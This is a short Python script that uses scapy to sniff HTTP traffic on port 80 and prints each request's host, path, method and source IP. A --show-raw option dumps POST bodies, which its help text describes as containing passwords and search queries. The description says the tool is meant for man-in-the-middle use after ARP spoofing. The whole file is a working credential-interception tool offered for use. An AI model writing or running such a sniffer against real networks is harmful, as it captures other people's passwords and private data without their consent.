from scapy.all import *
from scapy.layers.http import HTTPRequest
from colorama import init, Fore
# initialize colorama
init()
# define colors
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET


def sniff_packets(iface=None):
    """Sniff 80 port packets with `iface`, if None (default), then
    the scapy's default interface is used"""
    if iface:
        sniff(filter="port 80", prn=process_packet, iface=iface, store=False)
    else:
        sniff(filter="port 80", prn=process_packet, store=False)


def process_packet(packet):
    """This function is executed whenever a packet is sniffed"""
    if packet.haslayer(HTTPRequest):
        # if this packet is an HTTP Request, get the requested URL
        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        ip = packet[IP].src
        method = packet[HTTPRequest].Method.decode()
        print(f"\n{GREEN}[+] {ip} Requested {url} with {method}{RESET}")
        if show_raw and packet.haslayer(Raw) and method == "POST":
            print(f"\n{RED}[*] Some useful Raw data: {packet[Raw].load.decode()}{RESET}")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="HTTP Packet Sniffer, this is useful when you're a man in the middle."
        + "It is suggested that you run arp spoof before you use this script, otherwise it'll sniff your local browsing packets")
    parser.add_argument("-i", "--iface", help="Interface to use, default is scapy's default interface")
    parser.add_argument("--show-raw", dest="show_raw", action="store_true", help="Whether to print POST raw data, such as passwords, search queries, etc.")
    args = parser.parse_args()
    iface = args.iface
    show_raw = args.show_raw

    sniff_packets(iface)
